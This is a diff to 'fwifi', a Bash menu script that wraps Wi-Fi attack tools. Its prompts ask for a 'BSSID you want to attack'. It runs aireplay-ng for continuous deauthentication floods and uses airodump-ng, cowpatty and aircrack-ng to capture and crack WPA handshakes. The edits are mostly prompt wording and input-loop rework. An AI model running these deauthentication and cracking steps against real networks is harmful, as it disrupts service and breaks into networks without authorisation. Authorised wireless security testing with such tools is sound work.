@@ -85,9 +85,9 @@ intro_text=(
     ""
 )
 
-for line in "${intro_text[@]}"; do
-    type_effect "$line" 0.1
-done
+#for line in "${intro_text[@]}"; do
+#    type_effect "$line" 0.1
+#done
 
 read -p "[Info] Press [Enter] to continue..."
 
@@ -160,7 +160,7 @@ while true; do
               echo ""
 
               while true; do
-                  read -p "[fwifi] Enter the BSSID: " target_bssid
+                  read -p "[fwifi] Enter the BSSID you want to attack:: " target_bssid
 
                   if [[ ! "${target_bssid}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                       echo "[Error] Invalid BSSID format. Please enter a valid MAC address (e.g., XX:XX:XX:XX:XX:XX)."
@@ -182,15 +182,15 @@ while true; do
                       break
                   fi
               done
+              break
               ;;
-              
             2)
               # Capture Wi-Fi Data (Besside-ng)
               airodump-ng "${interface}"
               echo ""
 
               while true; do
-                  read -p "[fwifi] Enter the BSSID: " target_bssid
+                  read -p "[fwifi] Enter the BSSID you want to attack:: " target_bssid
 
                   if [[ ! "${target_bssid}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                       echo "[Error] Invalid BSSID format. Please enter a valid MAC address (e.g., XX:XX:XX:XX:XX:XX)."
@@ -211,6 +211,7 @@ while true; do
                       break
                   fi
               done
+              break
               ;;
             *)
               echo "[Error] Invalid choice."
@@ -220,44 +221,48 @@ while true; do
       ;;
     4)
       # Inject Wi-Fi Packets
-      read -p "[fwifi] Enter the MAC Address of the Access Point: " ap
+      while true; do
+          read -p "[fwifi] Enter the BSSID you want to attack:: " target_bssid
 
-      while [[ ! "${ap}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; do
-          echo "[Error] Invalid BSSID format. Please enter a valid MAC address (e.g., XX:XX:XX:XX:XX:XX)."
-          read -p "[fwifi] Enter the MAC Address of the Access Point: " ap
+          if [[ ! "${target_bssid}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+              echo "[Error] Invalid BSSID format. Please enter a valid MAC address (e.g., XX:XX:XX:XX:XX:XX)."
+          else
+              aireplay-ng -0 0 -a "${target_bssid}" "${interface}"
+              echo ""
+              read -p "[Info] Press [Enter] to continue..."
+              break
+          fi
       done
-
-      echo ""
-      aireplay-ng -0 0 -a "${ap}" "${interface}"
-      echo ""
-      read -p "[Info] Press [Enter] to continue..."
+      # break
       ;;
     5)
       # Check for valid 4-way frames
-      read -p "[fwifi] Enter the handshake file name: " file_handshake
+      while true; do
+          read -p "[fwifi] Enter the handshake file name:: " file_handshake
 
-      # Check if the specified file is not a .cap file
-      if [[ ! "${file_handshake}" =~ \.cap$ ]]; then
-          echo "[Error] Invalid file format. Please provide a valid .cap file."
-          # exit 1
-      fi
-
-      while [[ ! -f "${file_handshake}" ]]; do
-          echo "[Error] Handshake file '${file_handshake}' not found."
-          read -p "[fwifi] Enter the handshake file name: " file_handshake
+          # Check if the specified file is not a .cap file
+          if [[ ! "${file_handshake}" =~ \.cap$ ]]; then
+              echo "[Error] Invalid file format. Please provide a valid .cap file."
+              # exit 1
+          else
+              cowpatty -c -r "${file_handshake}"
+              echo ""
+              read -p "[Info] Press [Enter] to continue..."
+              break
+          fi
       done
-      echo ""
-      cowpatty -c -r "${file_handshake}"
-      echo ""
-      read -p "[Info] Press [Enter] to continue..."
       ;;
     6)
       # Crack Wi-Fi Key with aircrack-ng
-      read -p "[fwifi] Enter the handshake file name: " file_handshake
-
-      while [[ ! -f "${file_handshake}" ]]; do
-          echo "[Error] Handshake file '${file_handshake}' not found."
+      while true; do
           read -p "[fwifi] Enter the handshake file name: " file_handshake
+
+          # Check if the specified file is not a .cap file
+          if [[ ! "${file_handshake}" =~ \.cap$ ]]; then
+              echo "[Error] Invalid file format. Please provide a valid .cap file."
+          else
+              break
+          fi
       done
 
       echo ""
@@ -291,11 +296,16 @@ while true; do
             break
             ;;
           5)
-            read -p "[fwifi] Enter the custom wordlist file name: " file_wordlist
 
-            while [[ ! -f "${file_wordlist}" ]]; do
-                echo "[Error] Wordlist file '${file_wordlist}' not found."
+            while true; do
                 read -p "[fwifi] Enter the custom wordlist file name: " file_wordlist
+
+                # Check if the specified file is not a .cap file
+                if [[ ! -f "${file_wordlist}" ]]; then
+                    echo "[Error] Wordlist file '${file_wordlist}' not found."
+                else
+                    break
+                fi
             done
             break
             ;;
